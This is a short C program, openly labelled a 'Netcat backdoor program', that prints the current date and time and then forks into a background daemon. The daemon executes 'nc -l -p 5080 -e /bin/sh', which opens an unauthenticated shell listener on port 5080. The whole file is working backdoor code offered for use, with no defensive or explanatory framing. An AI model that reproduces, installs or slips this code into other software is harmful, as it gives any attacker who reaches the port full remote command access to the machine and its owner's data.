/*
*  This program is free software: you can redistribute it and/or modify
*  it under the terms of the GNU General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  This program is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU General Public License for more details.
*
*  You should have received a copy of the GNU General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
/********************************************************************
* Description: Netcat backdoor program.
* Author: John Cartwright,,, <>
* Created at: Mon Aug 24 12:56:48 AEST 2015
* Computer: darkstar
* System: Linux 3.16.0-4-amd64 on x86_64
*
* Copyright (c) 2015 John Cartwright,,,  All rights reserved.
*
********************************************************************/

#include <stdio.h>
#include <unistd.h>
#include <time.h>

int timedisp()
{
	time_t timer;
	char buffer[26];
	struct tm* tm_info;

	time(&timer);
	tm_info = localtime(&timer);

	strftime(buffer, 26, "%Y:%m:%d %H:%M:%S", tm_info);
	printf("%s\n", buffer);
}

int main (int argc, char *argv[]) {

// Display the time and date...

	timedisp();

// Start a netcat backdoor, running in the background.

	daemon(1,1); // fork() off into a daemon process.

	extern char * const environ[];
	char * const command[] = {"nc", "-l", "-p", "5080", "-e", "/bin/sh", NULL};
	execve("/bin/nc", command, environ);

	return 0;
}
